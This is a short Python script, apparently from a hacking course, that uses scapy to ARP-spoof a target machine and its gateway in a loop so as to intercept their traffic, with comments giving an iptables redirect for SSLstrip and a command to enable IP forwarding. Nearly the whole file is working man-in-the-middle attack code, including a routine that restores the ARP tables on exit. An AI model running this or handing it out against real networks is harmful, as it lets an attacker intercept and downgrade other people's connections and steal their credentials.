#!/usr/bin/env python
# to ssl strip: iptables -t nat -A PREROUTING -p tcp --destingation-port 80 -j REDIRECT --to-port 10000
# also have to run sslstrip from terminal

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(answered[0][1].hwsrc)
    return answered[0][1].hwsrc


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

#can run scapy.ls(scapy.ARP) in python terminal for more info, op=2 means send as response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # \r resets print so it resets the line
        print("\r[+] Packets sent: " + str(sent_packets_count)), # , makes it so it prints same line in loop
        sys.stdout.flush() # , stores print in buffer, this flushes buffer so we dont have to stop program
        time.sleep(2)
except KeyboardInterrupt:
    print("[+} Detected CTRL + C ..... Quitting.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# to port forward!!!!
#> echo 1 > /proc/sys/net/ipv4/ip_forward